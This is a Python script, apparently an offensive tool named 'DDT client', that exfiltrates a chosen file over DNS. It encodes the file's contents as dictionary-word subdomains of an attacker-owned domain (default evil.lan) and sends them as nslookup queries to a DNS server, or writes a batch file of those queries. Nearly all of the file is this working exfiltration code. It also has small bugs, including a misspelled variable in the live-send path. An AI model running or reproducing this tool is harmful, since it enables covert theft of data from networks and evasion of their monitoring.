from __future__ import print_function

import collections
import argparse
import logging
import time
import re
import sys
import string
from scapy.all import *

if __name__ == '__main__':

	print("""
  ___  ___ _____ 
 |   \|   \_   _|
 | |) | |) || |  
 |___/|___/ |_|  client v2.0 (by th3r3g3nt)
 Dictionary-based Data Transfer (via DNS)
 
 Definitely not good for your environment...""")

	p = argparse.ArgumentParser(description="DDT Client v2.0")
	
	p.add_argument("--data", default="target.txt",
		metavar="<data>",
		help = "The file to exfiltrate Default: target.txt)")

	p.add_argument("--dictionary", default="dict.txt",
		metavar="<word-dictionary>",
		help="The custom-word dictionary lookup for the DNS names. Default: dict.txt; MUST match on client & server.")

	p.add_argument("--domain", default="evil.lan",
		metavar="<domain>",
		help = "The exfiltration domain, which you are the SOA. Default: evil.lan")

	p.add_argument("--dnsserver", default="8.8.8.8",
		metavar="<dnsserver>",
		help = "The internal DNS server address. Default: 8.8.8.8 which probably not what you want")

	p.add_argument("--offline",
		metavar="<output batch filename>",
		help = "Create the nslookup batch file into this file for later or separate execution")

	p.add_argument("--port","-p",type=int,default=53,
		metavar="<port>",
		help="Server port. Default:53/UDP)")

	p.add_argument("--separator", "-s", default=":@@SEP@@:",
		metavar="<separator>",
		help="The dictionary file must have a exfildata<separator>subdomain structure. Default separator is :@@SEP@@:")

	p.add_argument("--verbose",action='store_true',default=False,
		help="Enable verbose output on the screen")

	p.add_argument("--ipv6",action='store_true',default=False,
		help="Use IPv6 AAAA record lookups; Default is IPv4 A record lookup")


	args = p.parse_args()

	if args.verbose:
		logging.basicConfig(level=logging.INFO)

	# Create the DNS table for translation
	dict = {}

	logging.info('Adding magic values to the dictionary')
	# Manual special values
	dict["\n"] = "feed-n"
	dict["\r\n"] = "feed-rn"
	dict["\t"] = "tab"
	dict["\0"] = "final"

	try:
		with open(args.dictionary, "r") as dict_file:
			logging.info('Using '+args.dictionary+' as the dictionary file')
			for line in dict_file:
				name, var = line.partition(args.separator)[::2]
				if name in dict:
					print ("Duplicate subdomain. Skipping")
				else:
					dict[name] = str(var.strip())
					logging.info('Dictionary entry created as dict[' + str(name) + '] = ' + str(var.strip()) )

		# Creating the reverse dictionary - mainly convenience
		rev_dict = {v: k for k, v in dict.items()}

	except:
		print ("\n[E] Cannot open dictionary file " + args.dictionary + "\nPlease provide a valid dictionary file!\n")
		exit(1)


	try:
		with open(args.data, "r") as exfil_file:
			data = exfil_file.read()
		logging.info('Will exfiltrate ' + args.data + ' file')
	except:
		print ("\n[E] Cannot open the file " + args.data + " for exfiltration.\nPlease provide a valid data this!\n")
		exit(1)


	# Create the most compact DNS subdomains, given that there is a regex match in the dictionary
	# print("WARNING! Need to implement dictionary health-check!")
	pattern = re.compile('|'.join(re.escape(key) for key in dict.keys()))
	ddt_results = pattern.sub(lambda x: dict[x.group()]+"\n", data)
	ddt_results = ddt_results.split()

	print ("The original data would be " + str(len(data)) + " queries, if extracted by single bytes")
	print ("With DDT, we are expecting " + str(len(ddt_results)) + " queries")
	print(str(100- int((100 * float(len(ddt_results))/float(len(data)))))+"% traffic saved")

	frag_counter = 0

	#Create the offline batch file
	try:
		if args.offline is not None:
			offline_file = open(args.offline, "w")
			logging.info('Offline batch file will be created to ' + args.offline + ' file')

#		else:
		

	except:
		print ("\n[E] Cannot open the file " + args.data + " for batch file creation.\nCan you write to this location?\n")
		exit(1)
	
	if args.ipv6:
		lookup_type = "-type=AAAA"
	else:
		lookup_type = "-type=A"

	for i in ddt_results:
		try:
#			if (i in dict.values()):
#
#				print("Created valid fragment as " + i + "." + args.domain + " \twhich is\t " + rev_dict[i])

			frag = i + "." + args.domain

			if offline_file is not None:
				offline_file.write("nslookup" + " " + lookup_type + " " + "-retry=0" + " " + frag + " " + args.dnsserver + "\n")

			# Send them packets awaaaay	
			else:
				packet = subprocess.check_output(["nslookup",lookup_tpye,"-retry=0",frag,args.dnsserver])
				logging.info(" Sent a valid fragment as " + frag + " \twhich is\t " + rev_dict[i])

				time.sleep(0.5)

				frag_counter += 1
				if frag_counter % 10 == 0:
					print ("Sent",str(frag_counter),"fragments out of",str(len(ddt_results)))

		except Exception as e:
			print ("[E] Cannot create frag ", e)


	print ("Sending final EOF magic word...")
	final_frag = "final." + args.domain
#	final_packet = sr1(IP(dst=args.dnsserver)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="final" + "." + args.domain )),timeout=1, retry=0, verbose=False)

	if offline_file is not None:
		offline_file.write("nslookup" + " " + lookup_type + " " + "-retry=0" + " " + final_frag + " " + args.dnsserver + "\n")
	else:
		final_packet = subprocess.check_output(["nslookup", lookup_tpye, "-retry=0", final_frag, args.dnsserver])

	print (" ** Thanks for playing! **")
	print (" ** Root for everyone! **")
	exit(0)